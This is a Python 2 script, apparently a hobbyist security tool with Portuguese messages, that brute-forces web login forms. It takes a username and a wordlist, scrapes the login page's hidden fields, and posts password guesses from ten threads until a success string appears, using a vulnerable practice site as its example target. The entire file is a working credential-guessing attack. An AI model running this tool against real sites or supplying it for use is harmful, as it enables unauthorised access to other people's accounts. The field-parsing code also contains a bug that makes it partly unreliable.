import urllib2,urllib,cookielib,threading,sys,Queue
from HTMLParser import HTMLParser
print('##################################################################\n')
print ("\n\n RFS BRUTEFORCE WEB FORMS \n\n")
print('##################################################################\n')
print('\n Site Page Login teste: testphp.vulnweb.com/login.php')
print('\n Wordlist teste: wordslist.txt')
print('\n Username teste: admin')
print('\n Input Username: uname')
print('\n Input Pass: pass')
user_thread = 10
username = raw_input("[+]Username: ")
target_url = 'http://'+raw_input("[+]Site Page Login: ")
wordlist= raw_input("[+]Wordlist: ")
username_field = raw_input("[+]Input Username: ")
password_file = raw_input("[+]Input Pass: ")
resume = None
sucess_check = "Administration - Control Panel"
target_post = target_url

class Bruter(object):
    def __init__(self,username,words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Configuracao terminada para : %s"%username)

    def run_brute(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print("\n[*]Trying:\n Login:%s => Senha: %s (%d left)" % (self.username,brute,self.password_q.qsize()))
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results
            post_tags[username_field] = self.username
            post_tags[password_file] = brute
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post,login_data)
            login_result = login_response.read()
            if sucess_check in login_result:
                self.found = True
                print("[*] Bruteforce success ")
                print("[*]Username: %s"%username)
                print("[*]Password: %s"%brute)
                print("[*] *____________* ")
            
    
            
class BruteParser(HTMLParser):
     def __init__(self):
         HTMLParser.__init__(self)
         self.tag_results = {}

     def handle_starttag(self,tag,attrs):
         if tag == 'input':
             tag_name = None
             tag_value = None
             for name,value in attrs:
                 if name == 'name':
                     tag_name = value
                 if name == 'value':
                     tag_value = value
             if tag_name is not None:
                 self.tag_results[tag_name]= value


def build_wordlist(wordlist):
    fd = open(wordlist,'rb')
    raw_words = fd.readlines()
    fd.close()
    found_resume = False
    words = Queue.Queue()
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if(word == resume):
                    found_resume = True
                    print('Resumindo wordlist de: %s'%resume)
        else:
            words.put(word)
    return words


words = build_wordlist(wordlist)
bruter_obj = Bruter(username,words)
bruter_obj.run_brute()
















    
        
